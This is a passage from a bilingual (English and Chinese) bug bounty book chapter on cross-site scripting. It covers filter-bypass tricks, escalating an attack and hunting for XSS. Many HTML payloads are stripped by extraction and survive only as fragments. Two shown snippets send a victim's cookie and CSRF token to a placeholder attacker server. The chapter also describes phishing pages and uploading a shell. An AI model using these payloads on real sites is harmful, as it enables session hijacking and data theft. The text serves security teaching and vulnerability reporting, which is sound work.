input fields. Often, they'll use a blocklist to filter out dangerous
expressions that might be indicative of XSS. Here are some strategies
for bypassing this type of protection.
大多数应用程序现在在其输入字段中实施某种XSS保护。通常，它们将使用块列表来过滤可能表明XSS的危险表达式。以下是规避这种保护的一些策略。
### Alternative JavaScript Syntax {#c06.xhtml#h2-501546c06-0009}
Often, applications will sanitize `           ` tags in user
input. If that is the case, try executing XSS that doesn't use a
`           ` tag. For example, remember that in certain
scenarios, you can specify JavaScript to run in other types of tags.
When you try to construct an XSS payload, you can also try to insert
code into HTML tag names or attributes instead. Say user input is passed
into an HTML image tag, like this:
通常，应用程序会对用户输入中的\标签进行清理。如果是这种情况，请尝试执行不使用\标签的XSS。例如，请记住，在某些情况下，您可以指定在其他类型的标记中运行JavaScript。在尝试构造XSS有效载荷时，您也可以尝试将代码插入HTML标记名称或属性中。例如，假设用户输入被传递到HTML图像标记中，如下所示：
Instead of closing out the image tag and inserting a script tag, like
this
不要关闭图像标签并插入脚本标签，应该这样做：
    "/>
you can insert the JavaScript code directly as an attribute to the
current tag:
你可以把 JavaScript 代码直接作为当前标签的属性插入：
Another way of injecting code without the `           ` tag is
to use the special URL schemes mentioned before. This snippet will
create a Click me! link that will generate an alert box when clicked:
另外一种在不使用\标签的情况下注入代码的方式是使用之前提到的特殊URL方案。以下代码片段将创建一个"点击我！"链接，单击后将生成一个警告框：
    Click me!"
### Capitalization and Encoding {#c06.xhtml#h2-501546c06-0010}
You can also mix different encodings and capitalizations to confuse the
XSS filter. For example, if the filter filters for only the string
`      "script"     ` , capitalize certain letters in your payload.
Since browsers often parse HTML code permissively and will allow for
minor syntax issues like capitalization, this won't affect how the
script tag is interpreted:
你也可以混合不同的编码和大小写来迷惑XSS过滤器。例如，如果过滤器只过滤字符串\"script\"，则可以在负载中将某些字母大写。由于浏览器通常宽松解析HTML代码并允许大小写等小的语法问题，这不会影响脚本标记的解释方式。
If the application filters special HTML characters, like single and
double quotes, you can't write any strings into your XSS payload
directly. But you could try using the JavaScript
`      fromCharCode()     ` function, which maps numeric codes to the
corresponding ASCII characters, to create the string you need. For
example, this piece of code is equivalent to the string
`      "http://attacker_server_ip/?c="     ` :
如果应用程序过滤特殊的HTML字符，比如单引号和双引号，你就不能直接将任何字符串写入XSS有效负载中。但是你可以尝试使用JavaScript
fromCharCode()函数，将数字代码映射到相应的ASCII字符，来创建所需的字符串。例如，以下代码段等同于字符串\"http://attacker_server_ip/?c=\"。
    String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107,
    101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)
[ ]{#c06.xhtml#Page_127 .pagebreak title="127"} This means you can
construct an XSS payload without quotes, like this:
这意味着您可以构建一个没有引号的 XSS 载荷，如下所示：
The `      String.fromCharCode()     ` function returns a string, given
an input list of ASCII character codes. You can use this piece of code
to translate your exploit string to an ASCII number sequence by using an
online JavaScript editor, like *https://js.do/* , to run the JavaScript
code or by saving it into an HTML file and loading it in your browser:
String.fromCharCode() 函数返回一个字符串，给定一个 ASCII
字符代码列表输入。您可以使用此代码段，通过使用在线 JavaScript 编辑器（如
https://js.do/）运行 JavaScript 代码或将其保存到 HTML
文件中并在浏览器中加载，将 exploit 字符串转换为 ASCII 数字序列。
The `      ascii()     ` function [ 1 ]{.CodeAnnotation
aria-label="annotation1"} converts characters to their ASCII numeric
representation. We run each character in the input string through
`      ascii()     ` [ 2 ]{.CodeAnnotation aria-label="annotation2"} .
Finally, we write the translated string to the document [ 3
]{.CodeAnnotation aria-label="annotation3"} . Let's translate the
payload `      http://attacker_server_ip/?c=     ` by using this code:
ascii（）函数将字符转换为它们的ASCII数字表示形式。我们将输入字符串中的每个字符通过ascii（）函数运行。最后，我们将翻译后的字符串写入文件。使用此代码翻译有效负载http://attacker_server_ip/？c
=。
This JavaScript code should print out
`      "104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61"     `
. You can then use it to construct your payload by using the
`      fromCharCode()     ` method.
这段 JavaScript 代码应该会打印出 \"104, 116, 116, 112, 58, 47, 47, 97,
116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95,
105, 112, 47, 63, 99, 61\"。然后，您可以使用 fromCharCode()
方法来构造有效载荷。
### Filter Logic Errors {#c06.xhtml#h2-501546c06-0011}
Finally, you could exploit any errors in the filter logic. For example,
sometimes applications remove all `           ` tags in the user
input to prevent XSS, but do it only once. If that's the case, you can
use a payload like this:
最后，您可以利用过滤逻辑中的任何错误。例如，有时应用程序会删除用户输入中的所有\标签以防止XSS，但只做一次。如果是这种情况，您可以使用此类有效负载：
    t>
    location='http://attacker_server_ip/c='+document.cookie;
    t>
Notice that each `           ` tag cuts another
`           ` tag in two. The filter won't recognize those
broken tags as legitimate, but once the filter removes [
]{#c06.xhtml#Page_128 .pagebreak title="128"} the intact tags from this
payload, the rendered input becomes a perfectly valid piece of
JavaScript code:
请注意每个\标记都会将另一个\标记分成两个部分。过滤器不会将这些断裂的标记识别为合法标记，但一旦过滤器从这个有效载荷中移除完整的标记，渲染的输入就变成了一个完美有效的JavaScript代码。
These are just a handful of the filter-bypass techniques that you can
try. XSS protection is difficult to do right, and hackers are constantly
coming up with new techniques to bypass protection. That's why hackers
are still constantly finding and exploiting XSS issues in the wild. For
more filter-bypass ideas, check out OWASP's XSS filter evasion cheat
sheet (
[https://owasp.org/www-community/xss-filter-evasion-cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet){.LinkURL}
). You can also simply Google for *XSS filter bypass* for more
interesting articles.
这些只是你可以尝试的规避过滤器技术的一小部分。正确执行XSS保护非常困难，而黑客不断想出新技术来规避保护。这就是为什么黑客仍在野外不断发现和利用XSS问题。要了解更多规避过滤器的想法，请查阅OWASP的XSS过滤器逃避秘籍（https://owasp.org/www-community/xss-filter-evasion-cheatsheet）。您还可以直接搜索XSS过滤器规避以获取更多有趣的文章。
## Escalating the Attack {#c06.xhtml#h1-501546c06-0006}
The impact of XSS varies because of several factors. For instance, the
type of XSS determines the number of users who could be affected. Stored
XSS on a public forum can realistically attack anyone who visits that
forum page, so stored XSS is considered the most severe. On the other
hand, reflected or DOM XSS can affect only users who click the malicious
link, and self-XSS requires a lot of user interaction and social
engineering to execute, so they are normally considered lower impact.
XSS的影响因素很多。例如，XSS类型决定了可能受到攻击的用户数量。在公共论坛上存储的XSS可以实际攻击到访问该论坛页面的任何人，因此存储的XSS被认为是最严重的。另一方面，反射或DOM
XSS只能影响点击恶意链接的用户，而自我XSS需要大量用户交互和社交工程才能执行，因此通常被认为是较低影响力的。
The identities of the affected users matter too. Let's say a stored XSS
vulnerability is on a site's server logs. The XSS can affect system
administrators and allow attackers to take over their sessions. Since
the affected users are accounts of high privilege, the XSS can
compromise the integrity of the entire application. You might gain
access to customer data, internal files, and API keys. You might even
escalate the attack into RCE by uploading a shell or execute scripts as
the admin.
受影响用户的身份也很重要。例如，一个存储型XSS漏洞存在于某个站点的服务器日志中。该漏洞可能会影响系统管理员，并允许攻击者接管其会话。由于受影响的用户具有高特权帐户，因此XSS漏洞可能会危及整个应用程序的完整性。您可能会获得客户数据、内部文件和API密钥的访问权限。您甚至可以通过上传Shell或作为管理员执行脚本来将攻击升级为RCE。
If, instead, the affected population is the general user base, XSS
allows attackers to steal private data like cookies and session tokens.
This can allow attackers to hijack any user's session and take over the
associated account.
如果受影响的人群是普通用户，XSS攻击允许攻击者窃取私人数据，例如cookies和会话标记。这可以让攻击者劫持任何用户的会话并接管相关账户。
Most of the time, XSS can be used to read sensitive information on the
victim's page. Since scripts executed during an XSS attack run as the
target page, the script is able to access any information on that page.
This means that you can use XSS to steal data and escalate your attack
from there. This can be done by running a script that sends the data
back to you. For example, this code snippet reads the CSRF token
embedded on the victim's page and sends it to the attacker's server as a
URL parameter named `      token     ` . If you can steal a user's CSRF
tokens, you can execute actions on their behalf by using those tokens to
bypass CSRF protection on the site. (See [ Chapter 9 ]{.xref
itemid="xref_target_Chapter 9"} for more on CSRF.)
大多数情况下，XSS 可用于读取受害者页面上的敏感信息。由于在 XSS
攻击期间执行的脚本运行为目标页面，因此该脚本能够访问该页面上的任何信息。这意味着可以使用
XSS
偷取数据并从那里升级攻击。这可以通过运行发送数据回您的脚本来完成。例如，此代码片段读取嵌入在受害者页面上的
CSRF 令牌，并将其作为名为令牌的 URL
参数发送到攻击者的服务器。如果您可以窃取用户的 CSRF
令牌，则可以使用这些令牌绕过站点上的 CSRF 保护代表他们执行操作。 （有关
CSRF 的更多信息，请参见第 9 章。）
    var token = document.getElementsById('csrf-token')[0];
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "http://attacker_server_ip/?token="+token, true);
    xhr.send(null);
[ ]{#c06.xhtml#Page_129 .pagebreak title="129"} XSS can also be used to
dynamically alter the page the victim sees, so you can replace the page
with a fake login page and trick the user into giving you their
credentials (often called *phishing* ). XSS can also allow attackers to
automatically redirect the victim to malicious pages and perform other
harmful operations while posing as the legit site, such as installing
malware. Before reporting the XSS you found, make sure to assess the
full impact of that particular XSS to include in your vulnerability
report.
XSS也可以动态改变受害者所看到的页面，这样你就可以用一个虚假的登录页面来替换原本页面，欺骗用户输入他们的密码（通常称为网络钓鱼）。XSS也可以让攻击者自动将受害者重定向到恶意页面并伪装成合法网站进行其他有害操作，例如安装恶意软件。在报告你发现的XSS之前，请确保评估该特定XSS的全部影响以在漏洞报告中予以考虑。
## Automating XSS Hunting {#c06.xhtml#h1-501546c06-0007}
XSS hunting can be time-consuming. You might spend hours inspecting
different request parameters and never find any XSS. Fortunately, you
can use tools to make your work more efficient.
XSS
搜索可能耗费很多时间。你可能会花费数小时检查不同请求参数，却始终找不到任何
XSS。幸运的是，你可以使用工具使你的工作更加高效。
First, you can use browser developer tools to look for syntax errors and
troubleshoot your payloads. I also like to use my proxy's search tool to
search server responses for reflected input. Finally, if the program you
are targeting allows automatic testing, you can use Burp intruder or
other fuzzers to conduct an automatic XSS scan on your target. We will
talk about this in [ Chapter 25 ]{.xref itemid="xref_target_Chapter 25"}
.
首先，你可以使用浏览器开发工具查找语法错误并排除你的有效载荷的问题。我也喜欢使用代理的搜索工具在服务器响应中搜索反射输入。最后，如果你针对的程序允许自动测试，你可以使用Burp
Intruder或其他模糊测试工具对目标进行自动XSS扫描。我们将在第25章讨论。
## Finding Your First XSS! {#c06.xhtml#h1-501546c06-0008}
Jump right into hunting for your first XSS! Choose a target and follow
the steps we covered in this chapter:
直接开始猎捕你的第一个XSS漏洞！选择一个目标，按照本章涉及的步骤进行操作：
1.  Look for user input opportunities on the application. When user
    input is stored and used to construct a web page later, test the
    input field for stored XSS. If user input in a URL gets reflected
    back on the resulting web page, test for reflected and DOM XSS.
2.  Insert XSS payloads into the user input fields you've found. Insert
    payloads from lists online, a polyglot payload, or a generic test
    string.